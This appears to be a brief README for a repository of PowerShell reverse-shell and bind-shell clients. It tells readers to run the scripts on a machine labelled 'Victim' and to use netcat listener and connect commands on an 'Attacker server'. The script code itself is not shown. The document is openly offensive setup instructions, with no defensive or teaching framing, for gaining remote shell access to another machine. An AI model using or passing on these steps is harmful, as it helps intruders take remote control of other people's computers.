# Appscript_reverseProxy
### Reverse shell版本
#### Victim
- rev_shell_client.ps1啟動即可
- 自行更改Server IP,port
####  Attacker server
- 在Ubuntu執行
```
nc- l 11111
```
- port:11111

### Binding shell版本
#### Victim

- bindshell_client.ps1啟動即可
- - 自行更改IP,port
####  Attacker server
```
nc client_IP Port
```
